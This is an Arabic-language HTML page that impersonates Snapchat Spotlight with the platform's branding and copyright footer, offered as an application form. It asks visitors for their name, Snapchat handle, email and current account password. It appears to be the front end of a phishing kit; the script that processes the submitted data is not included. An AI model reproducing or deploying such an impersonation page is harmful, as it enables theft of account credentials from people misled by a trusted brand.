<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تقديم طلب الانضمام</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header>
        <div class="container">
            <div class="logo">Snapchat Spotlight</div>
        </div>
    </header>

    <main class="container">
        <div class="form-wrapper">
            <h2 id="formHeader">نموذج تقديم الطلب</h2>
            
            <form id="submissionForm">
                
                <div class="form-group">
                    <label for="fullName" id="labelName">الاسم بالكامل:</label>
                    <input type="text" id="fullName" name="fullName" required autocomplete="name">
                </div>

                <div class="form-group">
                    <label for="snapchatHandle" id="labelSnapchat">معرّف حساب سناب شات:</label>
                    <input type="text" id="snapchatHandle" name="snapchatHandle" required autocomplete="username">
                </div>

                <div class="form-group">
                    <label for="trackingEmail" id="labelTrackingField">البريد الإلكتروني:</label>
                    <input type="email" id="trackingEmail" name="trackingEmail" required autocomplete="email">
                </div>

                <div class="form-group">
                    <label for="passwordField" id="labelPassword">كلمة المرور:</label>
                    <input type="password" id="passwordField" name="passwordField" required autocomplete="current-password">
                </div>

                <div id="statusMessage" class="status-message" style="display: none;"></div>

                <button type="submit" id="submitBtn" class="btn-primary">إرسال الطلب</button>
            </form>
            </div>
    </main>

    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
        <div class="loader"></div>
        <p id="loaderText">جاري معالجة الطلب...</p>
    </div>

    <footer>
        <div class="container">
            <p id="footerTextForm">© 2025 جميع الحقوق محفوظة لـ Snapchat</p>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>
